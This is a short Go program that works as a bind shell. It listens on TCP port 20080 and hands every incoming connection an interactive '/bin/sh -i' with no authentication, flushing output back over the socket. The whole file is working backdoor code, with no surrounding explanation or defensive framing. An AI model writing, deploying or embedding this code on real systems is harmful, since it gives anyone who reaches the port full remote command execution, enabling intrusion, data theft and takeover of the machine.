package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// for window cmd
func (f *Flusher) Write(b []byte) (count int, err error) {
	count, err = f.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err = f.w.Flush(); err != nil {
		return -1, err
	}

	return count, nil
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	cmd.Stdin = conn

	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}
}

func main() {
	liser, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatal(err)
	}

	log.Println("listen tcp :20080 ok")

	for {
		conn, err := liser.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go handle(conn)
	}
}
